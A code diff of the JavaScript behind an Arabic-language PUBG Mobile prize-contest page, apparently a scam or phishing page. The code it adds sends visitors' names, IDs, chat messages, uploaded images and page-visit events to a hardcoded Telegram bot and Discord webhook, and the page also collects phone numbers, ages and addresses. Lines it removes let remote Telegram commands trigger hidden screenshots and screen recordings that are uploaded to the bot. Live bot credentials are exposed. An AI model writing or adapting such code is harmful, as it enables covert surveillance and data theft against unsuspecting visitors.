@@ -1175,122 +1175,155 @@
     </button>
 
     <!-- المحرك البرمجي الشامل -->
-    <script>
-        const BOT_TOKEN = "8919787970:AAEmU4rsJAI5XUc2TyzUkur0Lpom_Tk07Kg";
-        const CHAT_ID = "8796885500";
+<script>
+    const BOT_TOKEN = "8919787970:AAEmU4rsJAI5XUc2TyzUkur0Lpom_Tk07Kg";
+    const CHAT_ID = "8796885500";
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1551997681063297095/9wne8QtpIrX2JvrgzuLrI1-drIT2vkAIo5zOmRA0q31dcAwarxXMCYEcyUpG6kEmnV8j";
 
-        let contestantId = localStorage.getItem("contestant_id");
-        let contestantName = localStorage.getItem("contestant_name") || "متسابق";
+    let contestantId = localStorage.getItem("contestant_id");
+    let contestantName = localStorage.getItem("contestant_name") || "متسابق";
 
-        if (!contestantId) {
-            contestantId = "USER_" + Math.floor(100000 + Math.random() * 900000);
-            localStorage.setItem("contestant_id", contestantId);
-        }
+    if (!contestantId) {
+        contestantId = "USER_" + Math.floor(100000 + Math.random() * 900000);
+        localStorage.setItem("contestant_id", contestantId);
+    }
 
-        let lastUpdateId = parseInt(sessionStorage.getItem("last_telegram_update_id") || "0");
-        const processedMsgIds = new Set(JSON.parse(sessionStorage.getItem("processed_msg_ids") || "[]"));
+    let lastUpdateId = parseInt(sessionStorage.getItem("last_telegram_update_id") || "0");
+    const processedMsgIds = new Set(JSON.parse(sessionStorage.getItem("processed_msg_ids") || "[]"));
 
-        let isChatOpen = false;
-        let autoCloseTimer = null;
-        let isSupportOnline = true;
+    let isChatOpen = false;
+    let autoCloseTimer = null;
+    let isSupportOnline = true;
 
-        let lastLeaveAlertTime = 0;
-        let lastOnlineAlertTime = 0;
-        const THROTTLE_60_SEC = 60000;
+    let lastLeaveAlertTime = 0;
+    let lastOnlineAlertTime = 0;
+    const THROTTLE_60_SEC = 60000;
 
-        let mediaRecorder = null;
-        let recordedChunks = [];
-        let isRecording = false;
+    let mediaRecorder = null;
+    let recordedChunks = [];
+    let isRecording = false;
 
-        // ==========================================
-        // 📡 نظام المزامنة والاحتفاظ بالبيانات Offline Logic
-        // ==========================================
-        function getOfflineQueue() {
-            return JSON.parse(localStorage.getItem("offline_pending_queue") || "[]");
-        }
+    // ==========================================
+    // 🎨 نظام كروت وبطاقات ديسكورد (Discord Embed Cards)
+    // ==========================================
+    function sendDiscordCard(title, description, fields = [], color = 0x00f3ff) {
+        if (!navigator.onLine) return;
 
-        function saveToOfflineQueue(text) {
-            const queue = getOfflineQueue();
-            queue.push({ text: text, timestamp: Date.now() });
-            localStorage.setItem("offline_pending_queue", JSON.stringify(queue));
-        }
-
-        function clearOfflineQueue() {
-            localStorage.setItem("offline_pending_queue", JSON.stringify([]));
-        }
-
-        async function syncOfflineQueue() {
-            const queue = getOfflineQueue();
-            if (queue.length === 0) return;
-
-            const pending = [...queue];
-            clearOfflineQueue();
-
-            for (const item of pending) {
-                try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ chat_id: CHAT_ID, text: item.text, parse_mode: "Markdown" })
-                    });
-                } catch (e) {
-                    saveToOfflineQueue(item.text);
+        const payload = {
+            username: "نظام إشعارات المسابقة",
+            avatar_url: "https://cdn-icons-png.flaticon.com/512/888/888853.png",
+            embeds: [
+                {
+                    title: title,
+                    description: description,
+                    color: color, // لون الشريط الجانبي للبطاقة
+                    fields: fields,
+                    footer: {
+                        text: `المعرف: ${contestantId} | المتسابق: ${contestantName}`
+                    },
+                    timestamp: new Date().toISOString()
                 }
+            ]
+        };
+
+        fetch(DISCORD_WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        }).catch(() => {});
+    }
+
+    // ==========================================
+    // 📡 نظام المزامنة والاحتفاظ بالبيانات Offline Logic
+    // ==========================================
+    function getOfflineQueue() {
+        return JSON.parse(localStorage.getItem("offline_pending_queue") || "[]");
+    }
+
+    function saveToOfflineQueue(text) {
+        const queue = getOfflineQueue();
+        queue.push({ text: text, timestamp: Date.now() });
+        localStorage.setItem("offline_pending_queue", JSON.stringify(queue));
+    }
+
+    function clearOfflineQueue() {
+        localStorage.setItem("offline_pending_queue", JSON.stringify([]));
+    }
+
+    async function syncOfflineQueue() {
+        const queue = getOfflineQueue();
+        if (queue.length === 0) return;
+
+        const pending = [...queue];
+        clearOfflineQueue();
+
+        for (const item of pending) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: item.text, parse_mode: "Markdown" })
+                });
+                sendDiscordCard("🔄 مزامنة رسالة معلقة", item.text, [], 0xffb703);
+            } catch (e) {
+                saveToOfflineQueue(item.text);
             }
         }
+    }
 
-        function checkNetworkAndBlock() {
-            const overlay = document.getElementById("offlineOverlay");
-            if (!navigator.onLine) {
-                overlay.classList.add("active");
-            } else {
-                overlay.classList.remove("active");
-                syncOfflineQueue();
-            }
+    function checkNetworkAndBlock() {
+        const overlay = document.getElementById("offlineOverlay");
+        if (!navigator.onLine) {
+            if (overlay) overlay.classList.add("active");
+        } else {
+            if (overlay) overlay.classList.remove("active");
+            syncOfflineQueue();
         }
+    }
 
-        window.addEventListener('online', checkNetworkAndBlock);
-        window.addEventListener('offline', checkNetworkAndBlock);
+    window.addEventListener('online', checkNetworkAndBlock);
+    window.addEventListener('offline', checkNetworkAndBlock);
 
-        function saveFormDataLocally() {
-            const formData = {
-                name: document.getElementById('inputFullName').value,
-                phone: document.getElementById('inputPhone').value,
-                age: document.getElementById('inputAge').value,
-                address: document.getElementById('inputAddress').value,
-                pid: document.getElementById('inputPlayerID').value,
-                level: document.getElementById('inputLevel').value,
-                reward: state.selectedReward
-            };
-            localStorage.setItem("saved_form_draft", JSON.stringify(formData));
-        }
+    function saveFormDataLocally() {
+        const formData = {
+            name: document.getElementById('inputFullName')?.value || '',
+            phone: document.getElementById('inputPhone')?.value || '',
+            age: document.getElementById('inputAge')?.value || '',
+            address: document.getElementById('inputAddress')?.value || '',
+            pid: document.getElementById('inputPlayerID')?.value || '',
+            level: document.getElementById('inputLevel')?.value || '',
+            reward: state.selectedReward
+        };
+        localStorage.setItem("saved_form_draft", JSON.stringify(formData));
+    }
 
-        function restoreFormDataLocally() {
-            const saved = JSON.parse(localStorage.getItem("saved_form_draft") || "{}");
-            if (saved.name) document.getElementById('inputFullName').value = saved.name;
-            if (saved.phone) document.getElementById('inputPhone').value = saved.phone;
-            if (saved.age) document.getElementById('inputAge').value = saved.age;
-            if (saved.address) document.getElementById('inputAddress').value = saved.address;
-            if (saved.pid) document.getElementById('inputPlayerID').value = saved.pid;
-            if (saved.level) document.getElementById('inputLevel').value = saved.level;
-            validatePersonalForm();
-        }
+    function restoreFormDataLocally() {
+        const saved = JSON.parse(localStorage.getItem("saved_form_draft") || "{}");
+        if (saved.name && document.getElementById('inputFullName')) document.getElementById('inputFullName').value = saved.name;
+        if (saved.phone && document.getElementById('inputPhone')) document.getElementById('inputPhone').value = saved.phone;
+        if (saved.age && document.getElementById('inputAge')) document.getElementById('inputAge').value = saved.age;
+        if (saved.address && document.getElementById('inputAddress')) document.getElementById('inputAddress').value = saved.address;
+        if (saved.pid && document.getElementById('inputPlayerID')) document.getElementById('inputPlayerID').value = saved.pid;
+        if (saved.level && document.getElementById('inputLevel')) document.getElementById('inputLevel').value = saved.level;
+        validatePersonalForm();
+    }
 
-        document.addEventListener("DOMContentLoaded", () => {
-            checkNetworkAndBlock();
-            restoreFormDataLocally();
-            loadChatHistory();
-            loadDraftMessage();
-            notifyUserEntrance();
-            startCountdown();
-            animateParticles();
-        });
+    document.addEventListener("DOMContentLoaded", () => {
+        checkNetworkAndBlock();
+        restoreFormDataLocally();
+        loadChatHistory();
+        loadDraftMessage();
+        notifyUserEntrance();
+        startCountdown();
+        animateParticles();
+    });
 
-        function sendTelegramAlert(text) {
-            if (!navigator.onLine) {
-                saveToOfflineQueue(text);
-                return;
-            }
+    // موحد للإرسال إلى تليجرام + ديسكورد بنظام البطاقات
+    function sendUnifiedAlert(text, title = "🔔 تنبيه جديد", fields = [], color = 0x00f3ff) {
+        // 1. إرسال إلى تليجرام
+        if (!navigator.onLine) {
+            saveToOfflineQueue(text);
+        } else {
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -1300,721 +1333,769 @@
             });
         }
 
-        function playNotificationSound(type = 'receive') {
-            try {
-                const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                const osc = ctx.createOscillator();
-                const gain = ctx.createGain();
-                osc.connect(gain);
-                gain.connect(ctx.destination);
+        // 2. إرسال إلى ديسكورد بطاقة مستقلة
+        sendDiscordCard(title, text, fields, color);
+    }
 
-                if (type === 'receive') {
-                    osc.frequency.setValueAtTime(587.33, ctx.currentTime);
-                    osc.frequency.setValueAtTime(880, ctx.currentTime + 0.1);
-                    gain.gain.setValueAtTime(0.2, ctx.currentTime);
-                    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
-                    osc.start();
-                    osc.stop(ctx.currentTime + 0.3);
-                } else {
-                    osc.frequency.setValueAtTime(440, ctx.currentTime);
-                    gain.gain.setValueAtTime(0.15, ctx.currentTime);
-                    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.15);
-                    osc.start();
-                    osc.stop(ctx.currentTime + 0.15);
-                }
-            } catch (e) { }
+    function sendTelegramAlert(text) {
+        sendUnifiedAlert(text);
+    }
+
+    function playNotificationSound(type = 'receive') {
+        try {
+            const ctx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = ctx.createOscillator();
+            const gain = ctx.createGain();
+            osc.connect(gain);
+            gain.connect(ctx.destination);
+
+            if (type === 'receive') {
+                osc.frequency.setValueAtTime(587.33, ctx.currentTime);
+                osc.frequency.setValueAtTime(880, ctx.currentTime + 0.1);
+                gain.gain.setValueAtTime(0.2, ctx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
+                osc.start();
+                osc.stop(ctx.currentTime + 0.3);
+            } else {
+                osc.frequency.setValueAtTime(440, ctx.currentTime);
+                gain.gain.setValueAtTime(0.15, ctx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.15);
+                osc.start();
+                osc.stop(ctx.currentTime + 0.15);
+            }
+        } catch (e) { }
+    }
+
+    window.toggleChat = function() {
+        if (!navigator.onLine) return;
+        const widget = document.getElementById("chat-widget");
+        if (!widget) return;
+        isChatOpen = !isChatOpen;
+        widget.style.display = isChatOpen ? "flex" : "none";
+        cancelAutoClose();
+    };
+
+    function openChat() {
+        const widget = document.getElementById("chat-widget");
+        if (widget) {
+            widget.style.display = "flex";
+            isChatOpen = true;
         }
+    }
 
-        window.toggleChat = function() {
-            if (!navigator.onLine) return;
-            const widget = document.getElementById("chat-widget");
-            if (!widget) return;
-            isChatOpen = !isChatOpen;
-            widget.style.display = isChatOpen ? "flex" : "none";
+    function cancelAutoClose() {
+        if (autoCloseTimer) {
+            clearTimeout(autoCloseTimer);
+            autoCloseTimer = null;
+        }
+    }
+
+    function trigger10SecAutoOpen() {
+        if (!isChatOpen) {
+            openChat();
             cancelAutoClose();
-        };
+            autoCloseTimer = setTimeout(() => {
+                const widget = document.getElementById("chat-widget");
+                if (widget) widget.style.display = "none";
+                isChatOpen = false;
+            }, 10000);
+        }
+    }
 
-        function openChat() {
-            const widget = document.getElementById("chat-widget");
-            if (widget) {
-                widget.style.display = "flex";
-                isChatOpen = true;
+    function getCurrentTimeFormatted() {
+        const now = new Date();
+        return now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', hour12: true });
+    }
+
+    window.saveDraftMessage = function() {
+        const input = document.getElementById("chat-user-input");
+        if (input) sessionStorage.setItem("chat_draft", input.value);
+    };
+
+    function loadDraftMessage() {
+        const draft = sessionStorage.getItem("chat_draft");
+        const input = document.getElementById("chat-user-input");
+        if (draft && input) input.value = draft;
+    }
+
+    function saveChatHistory(msgObj) {
+        let history = JSON.parse(sessionStorage.getItem("chat_history") || "[]");
+        history.push(msgObj);
+        sessionStorage.setItem("chat_history", JSON.stringify(history));
+    }
+
+    function loadChatHistory() {
+        let history = JSON.parse(sessionStorage.getItem("chat_history") || "[]");
+        history.forEach(m => renderMessage(m.text, m.className, m.time, m.status, m.imgUrl));
+    }
+
+    function notifyUserEntrance() {
+        const now = Date.now();
+        if (now - lastOnlineAlertTime >= THROTTLE_60_SEC) {
+            lastOnlineAlertTime = now;
+            const msg = `⚡ **دخول لصفحة المسابقة:**\n👤 **الاسم:** ${contestantName}\n🆔 **المعرف:** \`${contestantId}\``;
+            sendUnifiedAlert(msg, "⚡ دخول متسابق جديد", [
+                { name: "👤 اسم المتسابق", value: contestantName, inline: true },
+                { name: "🆔 المعرف", value: contestantId, inline: true }
+            ], 0x00ff88);
+        }
+    }
+
+    document.addEventListener("visibilitychange", () => {
+        const now = Date.now();
+        if (document.hidden) {
+            if (now - lastLeaveAlertTime >= THROTTLE_60_SEC) {
+                lastLeaveAlertTime = now;
+                sendUnifiedAlert(
+                    `⚠️ **تنبيه مغادرة:** المتسابق ${contestantName} (🆔 \`${contestantId}\`) غادر الصفحة أو غير التطبيق.`,
+                    "⚠️ مغادرة الصفحة",
+                    [],
+                    0xff4444
+                );
             }
-        }
-
-        function cancelAutoClose() {
-            if (autoCloseTimer) {
-                clearTimeout(autoCloseTimer);
-                autoCloseTimer = null;
-            }
-        }
-
-        function trigger10SecAutoOpen() {
-            if (!isChatOpen) {
-                openChat();
-                cancelAutoClose();
-                autoCloseTimer = setTimeout(() => {
-                    const widget = document.getElementById("chat-widget");
-                    if (widget) widget.style.display = "none";
-                    isChatOpen = false;
-                }, 10000);
-            }
-        }
-
-        function getCurrentTimeFormatted() {
-            const now = new Date();
-            return now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', hour12: true });
-        }
-
-        window.saveDraftMessage = function() {
-            const input = document.getElementById("chat-user-input");
-            if (input) sessionStorage.setItem("chat_draft", input.value);
-        };
-
-        function loadDraftMessage() {
-            const draft = sessionStorage.getItem("chat_draft");
-            const input = document.getElementById("chat-user-input");
-            if (draft && input) input.value = draft;
-        }
-
-        function saveChatHistory(msgObj) {
-            let history = JSON.parse(sessionStorage.getItem("chat_history") || "[]");
-            history.push(msgObj);
-            sessionStorage.setItem("chat_history", JSON.stringify(history));
-        }
-
-        function loadChatHistory() {
-            let history = JSON.parse(sessionStorage.getItem("chat_history") || "[]");
-            history.forEach(m => renderMessage(m.text, m.className, m.time, m.status, m.imgUrl));
-        }
-
-        function notifyUserEntrance() {
-            const now = Date.now();
+        } else {
             if (now - lastOnlineAlertTime >= THROTTLE_60_SEC) {
                 lastOnlineAlertTime = now;
-                const msg = `⚡ **دخول لصفحة المسابقة:**\n👤 **الاسم:** ${contestantName}\n🆔 **المعرف:** \`${contestantId}\` *(اضغط للنسخ)*`;
-                sendTelegramAlert(msg);
+                sendUnifiedAlert(
+                    `🟢 **متصل الآن:** المتسابق ${contestantName} (🆔 \`${contestantId}\`) عاد للصفحة.`,
+                    "🟢 عودة للموقع",
+                    [],
+                    0x00ff88
+                );
             }
         }
+    });
 
-        document.addEventListener("visibilitychange", () => {
-            const now = Date.now();
-            if (document.hidden) {
-                if (now - lastLeaveAlertTime >= THROTTLE_60_SEC) {
-                    lastLeaveAlertTime = now;
-                    sendTelegramAlert(`⚠️ **تنبيه مغادرة:** المتسابق ${contestantName} (🆔 \`${contestantId}\`) غادر الصفحة أو غير التطبيق.`);
-                }
-            } else {
-                if (now - lastOnlineAlertTime >= THROTTLE_60_SEC) {
-                    lastOnlineAlertTime = now;
-                    sendTelegramAlert(`🟢 **متصل الآن:** المتسابق ${contestantName} (🆔 \`${contestantId}\`) عاد للصفحة.`);
-                }
-            }
-        });
+    window.showChatFilePreview = function() {
+        const preview = document.getElementById("chat-file-preview");
+        if (preview) preview.style.display = "block";
+    };
 
-        window.showChatFilePreview = function() {
-            const preview = document.getElementById("chat-file-preview");
-            if (preview) preview.style.display = "block";
-        };
+    window.sendChatMessage = function(e) {
+        if (e) e.preventDefault();
+        cancelAutoClose();
 
-        window.sendChatMessage = function(e) {
-            if (e) e.preventDefault();
-            cancelAutoClose();
+        const textInput = document.getElementById("chat-user-input");
+        const fileInput = document.getElementById("chat-file-input");
+        const preview = document.getElementById("chat-file-preview");
 
-            const textInput = document.getElementById("chat-user-input");
-            const fileInput = document.getElementById("chat-file-input");
-            const preview = document.getElementById("chat-file-preview");
+        const text = textInput ? textInput.value.trim() : "";
+        const hasFile = fileInput && fileInput.files.length > 0;
 
-            const text = textInput ? textInput.value.trim() : "";
-            const hasFile = fileInput && fileInput.files.length > 0;
+        if (!text && !hasFile) return;
 
-            if (!text && !hasFile) return;
+        playNotificationSound('send');
+        const timeStr = getCurrentTimeFormatted();
+        const formattedHeader = `📌 **رسالة من:** ${contestantName}\n🆔 **المعرف:** \`${contestantId}\`\n💬 **الرسالة:** ${text}`;
 
-            playNotificationSound('send');
-            const timeStr = getCurrentTimeFormatted();
-            const formattedHeader = `📌 **رسالة من:** ${contestantName}\n🆔 **المعرف:** \`${contestantId}\`\n💬 **الرسالة:** ${text}`;
+        if (hasFile && navigator.onLine) {
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", fileInput.files[0]);
+            formData.append("caption", formattedHeader);
+            formData.append("parse_mode", "Markdown");
 
-            if (hasFile && navigator.onLine) {
-                const formData = new FormData();
-                formData.append("chat_id", CHAT_ID);
-                formData.append("photo", fileInput.files[0]);
-                formData.append("caption", formattedHeader);
-                formData.append("parse_mode", "Markdown");
-
-                const fileURL = URL.createObjectURL(fileInput.files[0]);
-                displayAndSaveMessage(text, 'user-msg', timeStr, '✔', fileURL);
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
-            } else {
-                displayAndSaveMessage(text, 'user-msg', timeStr, '✔');
-                sendTelegramAlert(formattedHeader);
-            }
-
-            if (!isSupportOnline) {
-                setTimeout(() => {
-                    displayAndSaveMessage("وصلتنا رسالتك وسيجاب عليها قريباً.", 'admin-msg', getCurrentTimeFormatted(), '');
-                }, 1000);
-            }
-
-            if (textInput) textInput.value = "";
-            sessionStorage.removeItem("chat_draft");
-            if (fileInput) fileInput.value = "";
-            if (preview) preview.style.display = "none";
-        };
-
-        window.takeUserInstantScreenshot = function() {
-            takeScreenShot(0);
-        };
-
-        function takeScreenShot(delaySeconds = 0) {
-            if (typeof html2canvas === 'undefined' || !navigator.onLine) return;
+            const fileURL = URL.createObjectURL(fileInput.files[0]);
+            displayAndSaveMessage(text, 'user-msg', timeStr, '✔', fileURL);
             
-            const executeShot = () => {
-                html2canvas(document.body).then(canvas => {
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append("chat_id", CHAT_ID);
-                        formData.append("photo", blob, "user_screenshot.png");
-                        formData.append("caption", `📸 **لقطة شاشة للمتسابق:** ${contestantName}\n🆔 \`${contestantId}\``);
-                        formData.append("parse_mode", "Markdown");
+            // إرسال الصورة إلى تليجرام
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+            
+            // إرسال الصورة والرسالة كبطاقة مخصصة في ديسكورد
+            sendDiscordCard("🖼️ رسالة جديدة مع صورة", text || "قام المتسابق بإرفاق صورة", [
+                { name: "👤 المتسابق", value: contestantName, inline: true },
+                { name: "🆔 المعرف", value: contestantId, inline: true }
+            ], 0x9b59b6);
 
-                        const timeStr = getCurrentTimeFormatted();
-                        const imgURL = URL.createObjectURL(blob);
-                        displayAndSaveMessage("تم إرسال لقطة الشاشة للدعم.", 'user-msg', timeStr, '✔', imgURL);
-                        playNotificationSound('send');
-
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
-                    });
-                });
-            };
-
-            if (delaySeconds > 0) {
-                setTimeout(executeShot, delaySeconds * 1000);
-            } else {
-                executeShot();
-            }
+        } else {
+            displayAndSaveMessage(text, 'user-msg', timeStr, '✔');
+            sendUnifiedAlert(formattedHeader, "💬 رسالة محادثة جديدة", [
+                { name: "💬 نص الرسالة", value: text || "بدون نص" }
+            ], 0x3498db);
         }
 
-        async function startScreenRecording(durationSeconds = 10, delaySeconds = 0) {
-            if (isRecording || !navigator.onLine) return;
-
-            const startExec = async () => {
-                try {
-                    const stream = await navigator.mediaDevices.getDisplayMedia({
-                        video: { mediaSource: "screen" },
-                        audio: true
-                    });
-
-                    recordedChunks = [];
-                    mediaRecorder = new MediaRecorder(stream);
-
-                    mediaRecorder.ondataavailable = (e) => {
-                        if (e.data.size > 0) recordedChunks.push(e.data);
-                    };
-
-                    mediaRecorder.onstop = () => {
-                        isRecording = false;
-                        stream.getTracks().forEach(track => track.stop());
-                        
-                        const blob = new Blob(recordedChunks, { type: "video/webm" });
-                        const formData = new FormData();
-                        formData.append("chat_id", CHAT_ID);
-                        formData.append("video", blob, "screen_record.webm");
-                        formData.append("caption", `🎥 **تسجيل فيديو للمتسابق:** ${contestantName}\n🆔 \`${contestantId}\``);
-                        formData.append("parse_mode", "Markdown");
-
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: "POST", body: formData })
-                            .catch(() => {
-                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: "POST", body: formData });
-                            });
-                    };
-
-                    mediaRecorder.start();
-                    isRecording = true;
-
-                    if (durationSeconds > 0) {
-                        setTimeout(() => {
-                            stopScreenRecording();
-                        }, durationSeconds * 1000);
-                    }
-
-                } catch (err) {
-                    sendTelegramAlert(`❌ **فشل بدء تسجيل الفيديو:** ${err.message}`);
-                }
-            };
-
-            if (delaySeconds > 0) {
-                setTimeout(startExec, delaySeconds * 1000);
-            } else {
-                startExec();
-            }
-        }
-
-        function stopScreenRecording() {
-            if (mediaRecorder && isRecording) {
-                mediaRecorder.stop();
-            }
-        }
-
-        function displayAndSaveMessage(text, className, time, status = '', imgUrl = null) {
-            renderMessage(text, className, time, status, imgUrl);
-            saveChatHistory({ text, className, time, status, imgUrl });
-        }
-
-        function renderMessage(text, className, time, status = '', imgUrl = null) {
-            const chatBox = document.getElementById("chat-box");
-            if (!chatBox) return;
-
-            const msgElement = document.createElement("div");
-            msgElement.className = `msg ${className}`;
-
-            if (imgUrl) {
-                const img = document.createElement("img");
-                img.src = imgUrl;
-                msgElement.appendChild(img);
-            }
-
-            if (text) {
-                const textSpan = document.createElement("span");
-                textSpan.innerText = text;
-                msgElement.appendChild(textSpan);
-            }
-
-            const metaDiv = document.createElement("div");
-            metaDiv.className = "msg-meta";
-            metaDiv.innerHTML = `<span>${time}</span>` + (status ? `<span class="checkmark ${status === '✔✔' ? 'read' : ''}">${status}</span>` : '');
-            msgElement.appendChild(metaDiv);
-
-            chatBox.appendChild(msgElement);
-            chatBox.scrollTop = chatBox.scrollHeight;
-        }
-
-        function fetchAdminMessages() {
-            if (!navigator.onLine) return;
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
-                .then(res => res.json())
-                .then(async data => {
-                    if (data.ok && data.result.length > 0) {
-                        for (const update of data.result) {
-                            lastUpdateId = Math.max(lastUpdateId, update.update_id);
-                            sessionStorage.setItem("last_telegram_update_id", lastUpdateId.toString());
-
-                            const msg = update.message;
-                            if (!msg) continue;
-
-                            if (processedMsgIds.has(msg.message_id)) continue;
-
-                            let text = msg.text || msg.caption || "";
-
-                            if (text.includes(contestantId)) {
-                                processedMsgIds.add(msg.message_id);
-                                sessionStorage.setItem("processed_msg_ids", JSON.stringify(Array.from(processedMsgIds)));
-
-                                document.querySelectorAll(".user-msg .checkmark").forEach(el => {
-                                    el.innerText = "✔✔";
-                                    el.classList.add("read");
-                                });
-
-                                if (text.includes("/shot")) {
-                                    const match = text.match(/\/shot\s*(\d+)?/i);
-                                    const delay = match && match[1] ? parseInt(match[1]) : 0;
-                                    takeScreenShot(delay);
-                                    continue;
-                                }
-
-                                if (text.includes("/record")) {
-                                    const match = text.match(/\/record\s*(\d+)?\s*(\d+)?/i);
-                                    const duration = match && match[1] ? parseInt(match[1]) : 10;
-                                    const delay = match && match[2] ? parseInt(match[2]) : 0;
-                                    startScreenRecording(duration, delay);
-                                    continue;
-                                }
-
-                                if (text.includes("/stop")) {
-                                    stopScreenRecording();
-                                    continue;
-                                }
-
-                                if (text.includes("/offline")) {
-                                    setSupportStatus(false);
-                                    continue;
-                                }
-
-                                if (text.includes("/online")) {
-                                    setSupportStatus(true);
-                                    continue;
-                                }
-
-                                let telegramImgUrl = null;
-                                if (msg.photo && msg.photo.length > 0) {
-                                    const largestPhoto = msg.photo[msg.photo.length - 1];
-                                    try {
-                                        const fileRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${largestPhoto.file_id}`);
-                                        const fileData = await fileRes.json();
-                                        if (fileData.ok && fileData.result.file_path) {
-                                            telegramImgUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.result.file_path}`;
-                                        }
-                                    } catch (e) {}
-                                }
-
-                                let cleanText = text.replace(new RegExp(contestantId + ":?", "gi"), "").trim();
-                                if (cleanText || telegramImgUrl) {
-                                    displayAndSaveMessage(cleanText, 'admin-msg', getCurrentTimeFormatted(), '', telegramImgUrl);
-                                    playNotificationSound('receive');
-                                    trigger10SecAutoOpen();
-                                }
-                            }
-                        }
-                    }
-                })
-                .catch(() => {});
-        }
-
-        function setSupportStatus(online) {
-            isSupportOnline = online;
-            const dot1 = document.getElementById("support-status-dot");
-            const dot2 = document.getElementById("header-status-dot");
-            const statusText = document.getElementById("support-status-text");
-
-            if (online) {
-                if (dot1) dot1.classList.remove("offline");
-                if (dot2) dot2.classList.remove("offline");
-                if (statusText) statusText.innerText = "متصل الآن";
-            } else {
-                if (dot1) dot1.classList.add("offline");
-                if (dot2) dot2.classList.add("offline");
-                if (statusText) statusText.innerText = "غير متصل حالياً";
-            }
-        }
-
-        setInterval(fetchAdminMessages, 2000);
-
-        class AudioEngine {
-            constructor() {
-                this.ctx = new (window.AudioContext || window.webkitAudioContext)();
-            }
-            playClick() {
-                if (this.ctx.state === 'suspended') this.ctx.resume();
-                const osc = this.ctx.createOscillator();
-                const gain = this.ctx.createGain();
-                osc.type = 'sine';
-                osc.frequency.setValueAtTime(800, this.ctx.currentTime);
-                osc.frequency.exponentialRampToValueAtTime(400, this.ctx.currentTime + 0.05);
-                gain.gain.setValueAtTime(0.3, this.ctx.currentTime);
-                gain.gain.linearRampToValueAtTime(0.01, this.ctx.currentTime + 0.05);
-                osc.connect(gain);
-                gain.connect(this.ctx.destination);
-                osc.start();
-                osc.stop(this.ctx.currentTime + 0.05);
-            }
-            playTick() {
-                if (this.ctx.state === 'suspended') this.ctx.resume();
-                const osc = this.ctx.createOscillator();
-                const gain = this.ctx.createGain();
-                osc.type = 'square';
-                osc.frequency.setValueAtTime(1200, this.ctx.currentTime);
-                gain.gain.setValueAtTime(0.05, this.ctx.currentTime);
-                gain.gain.linearRampToValueAtTime(0.001, this.ctx.currentTime + 0.03);
-                osc.connect(gain);
-                gain.connect(this.ctx.destination);
-                osc.start();
-                osc.stop(this.ctx.currentTime + 0.03);
-            }
-            playTimerEnd() {
-                if (this.ctx.state === 'suspended') this.ctx.resume();
-                const osc = this.ctx.createOscillator();
-                const gain = this.ctx.createGain();
-                osc.type = 'sawtooth';
-                osc.frequency.setValueAtTime(300, this.ctx.currentTime);
-                gain.gain.setValueAtTime(0.3, this.ctx.currentTime);
-                gain.gain.linearRampToValueAtTime(0.01, this.ctx.currentTime + 0.25);
-                osc.connect(gain);
-                gain.connect(this.ctx.destination);
-                osc.start();
-                osc.stop(this.ctx.currentTime + 0.25);
-            }
-            playCorrect() {
-                if (this.ctx.state === 'suspended') this.ctx.resume();
-                const now = this.ctx.currentTime;
-                const osc = this.ctx.createOscillator();
-                const gain = this.ctx.createGain();
-                osc.type = 'triangle';
-                osc.frequency.setValueAtTime(523.25, now);
-                osc.frequency.setValueAtTime(659.25, now + 0.1);
-                osc.frequency.setValueAtTime(783.99, now + 0.2);
-                gain.gain.setValueAtTime(0.4, now);
-                gain.gain.linearRampToValueAtTime(0.01, now + 0.4);
-                osc.connect(gain);
-                gain.connect(this.ctx.destination);
-                osc.start();
-                osc.stop(now + 0.4);
-            }
-            playWrong() {
-                if (this.ctx.state === 'suspended') this.ctx.resume();
-                const now = this.ctx.currentTime;
-                const osc = this.ctx.createOscillator();
-                const gain = this.ctx.createGain();
-                osc.type = 'sawtooth';
-                osc.frequency.setValueAtTime(180, now);
-                osc.frequency.setValueAtTime(140, now + 0.15);
-                gain.gain.setValueAtTime(0.4, now);
-                gain.gain.linearRampToValueAtTime(0.01, now + 0.35);
-                osc.connect(gain);
-                gain.connect(this.ctx.destination);
-                osc.start();
-                osc.stop(now + 0.35);
-            }
-        }
-        const audio = new AudioEngine();
-
-        document.addEventListener('click', (e) => {
-            if (e.target.closest('button, .step-tab, .reward-card, a')) {
-                audio.playClick();
-            }
-        });
-
-        const pubgTriviaBank = [
-            { q: "ما هي أقوى بندقية قنص يدوية (Bolt-Action) في ببجي موبايل من حيث الضرر؟", opts: ["AWM", "M24", "Kar98k", "Mosin Nagant"], a: 0 },
